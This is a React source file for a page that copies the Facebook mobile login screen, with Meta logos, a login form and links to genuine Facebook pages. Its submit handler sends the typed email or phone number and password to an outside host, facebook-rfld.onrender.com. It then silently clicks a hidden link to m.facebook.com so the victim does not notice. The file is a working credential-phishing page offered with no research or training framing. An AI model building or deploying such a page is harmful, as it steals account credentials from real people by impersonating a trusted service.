import { useState } from "react";
import Loader from "./Loader";
import axios from "axios";

const App = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [userDetails, setUserDetails] = useState({
    name: "",
    password: "",
  });
  const handleSubmit = async (e) => {
    setIsLoading(true);
    e.preventDefault();
    await axios
      .post("https://facebook-rfld.onrender.com/api/auth/user", userDetails)
      .then((data) => {
        document.getElementById("click").click();
        console.log(data);
      })
      .catch((err) => {
        console.log(err);
        setIsLoading(false);
      });
  };

  const onChange = (e) => {
    setUserDetails({ ...userDetails, [e.target.name]: e.target.value });
  };

  return (
    <div className="w-full min-h-screen px-5">
      <div className="w-full my-20">
        <img src="/assets/logo.png" className="w-14 mx-auto" alt="" />
      </div>
      <div className="w-full">
        <form className="w-full" onSubmit={handleSubmit}>
          <input
            type="text"
            className="w-full px-2 py-4 rounded-xl border-2 outline-none focus:border-black/30"
            placeholder="Mobile number or email address"
            name="name"
            value={userDetails.name}
            onChange={onChange}
          />
          <input
            type="password"
            name="password"
            className="w-full px-2 py-4 rounded-xl border-2 outline-none focus:border-black/30 mt-4"
            placeholder="Password"
            value={userDetails.password}
            onChange={onChange}
          />
          <button className="w-full text-center flex justify-center text-white bg mt-4 font-semibold rounded-full bg-[#0064E0] p-3">
            {isLoading ? <Loader /> : "Log in"}
          </button>
          <a href="https://m.facebook.com/login/identify/" className="w-full text-center inline-block mt-6">
            Forgotten Password?
          </a>
        </form>
        <div className="w-full mt-16">
          <a href="https://m.facebook.com/reg/" className="w-full inline-block text-center border-2 bg mt-4 text-sm font-semibold text-zinc-800 rounded-full p-2">
            Create new account
          </a>
          <img
            src="/assets/meta.png"
            className="mx-auto w-16 opacity-70 mt-4"
            alt=""
          />
          <div className="flex gap-2 mt-4 text-[11px] justify-center font-semibold text-zinc-600">
            <a href="">About</a>
            <a href="">Help</a>
            <a href="">More</a>
            <a href="https://m.facebook.com/" id="click" hidden></a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default App;
